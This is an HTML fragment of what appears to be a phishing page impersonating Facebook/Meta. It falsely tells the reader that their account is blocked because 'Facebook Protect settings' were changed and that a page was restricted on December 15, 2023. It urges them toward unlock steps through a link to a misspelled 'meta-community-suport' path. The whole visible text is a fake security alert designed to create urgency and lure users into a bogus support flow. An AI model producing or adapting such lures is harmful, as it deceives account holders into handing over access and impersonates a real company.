...
<head>
    ...
    <meta property=og:image content=/static/uploads/1c325477ab8db1be14392399bff625fc.png>
    <meta property=twitter:image content=/static/uploads/1c325477ab8db1be14392399bff625fc.png>
            ...
            <div>
                <div class="bg-[#F1F2F6] flex justify-center items-center h-screen">
                    <div
                        ...
                        <img src="static/images/f_locked.png" class="w-[70%] mx-auto">
                        <p class="font-bold text-2xl">The security of your account is at risk.</p>
                        <p class="my-3"> We have temporarily blocked your account because your Facebook Protect settings
                            have been modified. </p>
                        <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
                            <div class="text-2xl text-yellow-600"><ion-icon name="warning-outline" role="img"
                                    class="md hydrated">
                            ...
                            <div>
                                <p class="font-semibold text-lg">Your page was restricted on December 15, 2023.</p>
                                <p>We did this to protect your account from being suspended.</p>
                            </div>
                        </div>
                        <p class="mt-3 mb-5"> We will guide you through some steps to lift the page restriction and
                            unlock your account. </p><a href="meta-community-suport"
